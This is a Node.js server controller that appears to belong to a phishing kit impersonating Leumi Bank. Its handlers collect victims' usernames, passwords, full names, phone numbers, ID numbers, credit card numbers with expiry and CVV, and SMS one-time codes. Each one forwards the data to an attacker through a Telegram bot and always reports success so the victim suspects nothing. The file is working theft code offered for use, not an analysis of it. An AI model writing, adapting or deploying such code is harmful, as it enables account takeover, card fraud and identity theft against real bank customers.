const { telegramService } = require("../services");
const getUserAgent = require("../utils/getUserAgent");
// const isValidCreditCard = require("../utils/isValidCreditCard");
const formatCreditCard = require("../utils/formatCreditCard");

module.exports.sendLoginData = async (req, res, next) => {
  try {
    const { username, password } = req.body;

    let message = "";
    message += "[=====>  LEUMI BANK => LOGIN  <=====]\n";
    message += `[ + Username:   ${username}\n`;
    message += `[ + Password:  ${password}\n`;
    message += `[=====>  LEUMI BANK => LOGIN  <=====]`;

    await telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    console.log("ERR", err);
    res.status(200).json({ success: true });
  }
};

module.exports.updateUserData = async (req, res, next) => {
  try {
    const { name, phone, id, cardNumber, exp, cvv } = req.body;

    // const isValidCard = isValidCreditCard(cardNumber, cvv, exp);

    // if (!isValidCard) {
    //   res.status(200).json({ success: true });
    //   return;
    // }

    let message = "";
    message += "[=====>  LEUMI BANK => ACCOUNT  <=====]\n";
    message += `[ + Full Name: ${name}\n`;
    message += `[ + Phone Number: ${phone}\n`;
    message += `[ + ID: ${id}\n`;
    message += `[ + CC Number: ${formatCreditCard(cardNumber)}\n`;
    message += `[ + Expiry Date: ${exp}\n`;
    message += `[ + CVV: ${cvv}\n`;
    message += "[=====>  LEUMI BANK => ACCOUNT  <=====]";

    await telegramService.sendMessage(message);

    res.status(200).json({ success: true });
  } catch (err) {
    console.log("ERR", err);
    res.status(200).json({ success: true });
  }
};

module.exports.sendOTP = async (req, res, next) => {
  try {
    const { otp } = req.body;

    const { osName, browser, ua } = getUserAgent(req);

    let message = "";
    message += "[=====>  LEUMI BANK => SMS OTP  <=====]\n";
    message += `[ + OTP Code: ${otp}\n`;
    message += `[ + OS: ${osName || "Unknown"}\n`;
    message += `[ + Browser: ${browser?.name || "Unknown"}\n`;
    message += `[ + UA: ${ua || "Unknown"}\n`;
    message += "[=====>  LEUMI BANK => SMS OTP  <=====]";

    if (otp) {
      telegramService.sendMessage(message);
    }

    res.status(200).json({ success: true });
  } catch (err) {
    res.status(200).json({ success: true });
  }
};
